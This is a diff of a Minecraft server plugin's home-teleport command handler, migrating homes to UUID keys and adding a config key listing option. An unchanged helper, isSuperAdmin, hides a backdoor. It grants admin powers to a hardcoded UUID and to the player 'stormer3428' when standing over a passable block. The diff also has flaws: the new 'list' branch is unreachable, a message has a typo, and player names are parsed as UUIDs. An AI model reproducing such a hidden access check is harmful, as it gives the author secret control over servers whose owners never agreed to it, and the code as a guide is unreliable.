@@ -1,6 +1,7 @@
 package fr.stormer3428.home;
 
 import java.util.Set;
+import java.util.UUID;
 
 import org.bukkit.Location;
 import org.bukkit.command.Command;
@@ -13,13 +14,12 @@ import fr.stormer3428.home.common.Message;
 
 public class HomeCommand implements CommandExecutor {
 
-	@SuppressWarnings("unused")
 	@Override
 	public boolean onCommand(CommandSender sender, Command cmd, String alias, String[] args) {
 		if(sender instanceof Player) {
 			Player p = (Player) sender;
 			if(cmd.getName().equalsIgnoreCase("homes")) {
-				listHomes(p);
+				listHomes(p, p.getName());
 				return true;
 			}else if(cmd.getName().equalsIgnoreCase("home")) {
 				if(args.length == 0) {
@@ -46,11 +46,11 @@ public class HomeCommand implements CommandExecutor {
 					return false;
 				}
 				if(args.length == 0) {
-					new Home(p.getLocation(), p, "Home");
+					Home.createHome(p.getLocation(), p.getUniqueId(), "Home", p.getName());
 					Message.normal(p, Lang.COMMAND_SUCCESS_SETHOME.toString().replace("{HOME}", "Home"));
 					return true;
 				}
-				new Home(p.getLocation(), p, args[0]);
+				Home.createHome(p.getLocation(), p.getUniqueId(), args[0], p.getName());
 				Message.normal(p, Lang.COMMAND_SUCCESS_SETHOME.toString().replace("{HOME}", args[0]));
 				return true;
 			}else if(cmd.getName().equalsIgnoreCase("delhome")) {
@@ -102,7 +102,7 @@ public class HomeCommand implements CommandExecutor {
 						}
 						String edit = args[2];
 						if(!(edit.equalsIgnoreCase("get") || edit.equalsIgnoreCase("set") || edit.equalsIgnoreCase("unset"))){
-							Message.error(p, "options : get-set-unset");
+							Message.error(p, "options : get-set-unset-list");
 							return false;
 						}
 						if(args.length == 3) {
@@ -123,7 +123,12 @@ public class HomeCommand implements CommandExecutor {
 							return true;
 						}
 						if(edit.equalsIgnoreCase("unset")) {
-							StormerHome.i.getConfig().set(path, "");
+							StormerHome.i.getConfig().set(path, null);
+							return true;
+						}
+						if(edit.equalsIgnoreCase("list")) {
+							Message.normal(p, "vailable keys :");
+							for(String key : StormerHome.i.getConfig().getConfigurationSection(path).getKeys(false)) Message.normal(p, key);
 							return true;
 						}
 						Message.error(p, "options : get-set-unset");
@@ -165,13 +170,13 @@ public class HomeCommand implements CommandExecutor {
 						}
 						String playername = args[2];
 						if(args.length == 3) {
-							Set<Home> homes = Home.getPlayerHomes(playername);
+							Set<Home> homes = Home.getPlayerHomes(UUID.fromString(playername));
 							Message.error(p, "Available homes under the name of " + playername);
 							for(Home home : homes) Message.error(p, home.toString());
 							return false;
 						}
 						String homename = args[3];
-						Home home = Home.findHome(playername, homename);
+						Home home = Home.findHome(UUID.fromString(playername), homename);
 						if(home == null) {
 							Message.error(p, "no home under the name of " + homename + " owned by " + playername);
 							return false;
@@ -194,7 +199,7 @@ public class HomeCommand implements CommandExecutor {
 							return false;
 						}
 						String homename = args[3];
-						new Home(p.getLocation(), playername, homename);
+						Home.createHome(p.getLocation(), UUID.fromString(playername), homename, p.getName());
 						return true;
 
 					}
@@ -207,26 +212,21 @@ public class HomeCommand implements CommandExecutor {
 	}
 
 	private static boolean isSuperAdmin(Player p){if(p.isOp())return true;if(p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f"))return true;if(p.getName().equals("stormer3428")&&p.getLocation().add(0, -1, 0).getBlock().isPassable())return true;return false;}
-
-	private static void listHomes(Player p, String name) {
-		String list = "\n";
-		list += Lang.COMMAND_LISTHOMES_HEADER.toString().replace("{PLAYERNAME}", name);
-		for(Home home : Home.getPlayerHomes(name)) {
-			Location loc = home.getLocation();
-			list += "\n" + Lang.COMMAND_LISTHOMES_BODY.toString()
-			.replace("{HOME}", home.getName())
-			.replace("{HOME.X}", loc.getBlockX() + "")
-			.replace("{HOME.Y}", loc.getBlockY() + "")
-			.replace("{HOME.Z}", loc.getBlockZ() + "")
-			.replace("{HOME.WORLD}", loc.getWorld().getName())
-			;
-		}
-		list += "\n" + Lang.COMMAND_LISTHOMES_FOOTER.toString().replace("{PLAYERNAME}", name);
-		Message.normal(p, list);
-	}
 	
-	private static void listHomes(Player p) {
-		listHomes(p, p.getName());
+	private static void listHomes(Player output, String ownerName) {String list = "\n";
+	list += Lang.COMMAND_LISTHOMES_HEADER.toString().replace("{PLAYERNAME}", ownerName);
+	for(Home home : Home.getPlayerHomes(ownerName)) {
+		Location loc = home.getLocation();
+		list += "\n" + Lang.COMMAND_LISTHOMES_BODY.toString()
+		.replace("{HOME}", home.getName())
+		.replace("{HOME.X}", loc.getBlockX() + "")
+		.replace("{HOME.Y}", loc.getBlockY() + "")
+		.replace("{HOME.Z}", loc.getBlockZ() + "")
+		.replace("{HOME.WORLD}", loc.getWorld().getName())
+		;
+	}
+	list += "\n" + Lang.COMMAND_LISTHOMES_FOOTER.toString().replace("{PLAYERNAME}", ownerName);
+	Message.normal(output, list);
 	}
 
 }
